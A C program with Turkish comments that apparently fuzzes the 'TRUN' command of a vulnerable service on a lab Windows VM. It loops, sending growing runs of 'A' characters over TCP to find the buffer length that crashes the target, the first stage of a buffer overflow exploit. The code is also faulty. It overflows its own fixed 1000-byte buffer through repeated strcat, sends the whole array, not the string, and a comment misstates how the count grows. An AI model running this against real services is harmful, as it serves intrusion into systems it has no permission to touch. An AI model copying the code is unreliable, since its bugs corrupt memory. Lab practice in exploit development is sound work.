#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
    char buff[1000] = "TRUN /.:/";
    int nm = 100;
        while(1) {
            int scket = socket(AF_INET, SOCK_STREAM, 0);
                if (scket == -1) {
                    printf("Not Create Socket....\n");
                }
                else {
                    struct sockaddr_in sock;
                        sock.sin_addr.s_addr = inet_addr("192.168.0.27");
                        sock.sin_family = AF_INET;
                        sock.sin_port = htons(9999);
                            // Server: 192.168.0.27:9999 (vm windows 10)

                         int cnt = connect(scket, (struct sockaddr*)&sock, sizeof(sock));
                          if (cnt == -1) {
                            printf("Connection Error...");
                            close(scket);
                          }
                            int i = 0;
                             for(; i < nm + 8; i++) {
                                /* Bu döngüde nm+8 (108) kadar buff değişkenine "A" değerini ekler. Fakat bu döngüden çıkıp tekrar geldiğinde  bu arttırma işlemi iki katına çıkar.
                                Mesela bu döngüde 100 kere arttırıp döngüden çıktıktan sonra nm'yi 100 kere arttırdıktan sonra tekrar bu döngüye geldiğinde 200 olacaktır. Böyle böyle artacaktır.
                                */
                                strcat(buff, "A");  // Burada buff değişkenine nm+8 kere A değerini ekler. Mesela sonuç şu şekilde olur: TRUN /.:/AAAAAAAAAAAAA gibi. 
                                printf("Buff Lenght: %d\n", strlen(buff));  // Burada program hangi uzunlukta crash verdiğini görebilmek için buff değişkenin sürekli aktif olarak uzunluğu ekrana bastırılıyor
                             }
                             int wr = write(scket, buff, sizeof(buff)); // burada ise write komutu kullanılarak oluşturulan sockete buff değişkeni gönderir. 
                                if (wr == -1) {
                                    printf("Crashed At");
                                    close(scket);
                                }
                             nm += 100; 
                             sleep(1);
                }
                
        }
}
